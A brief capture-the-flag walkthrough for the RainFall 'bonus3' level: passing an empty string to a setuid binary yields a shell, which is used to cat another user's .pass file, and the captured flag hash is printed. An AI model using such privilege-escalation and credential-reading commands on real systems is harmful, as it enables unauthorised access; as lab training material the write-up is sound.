bonus3
======

*	We spawn with a [bonus3](src/bonus3) executable
	```console
	bonus3@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
	```
*	The [code](src/bonus3.c) is pretty straight forward, in the end it compares argv[1] to an empty string.
*	There is one important line here which tells us where the pass is contained: `file = fopen("/home/user/end/.pass", "r");`
	```console
	bonus3@RainFall:~$ ./bonus3 ""
	$ cat /home/user/end/.pass
	3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
	```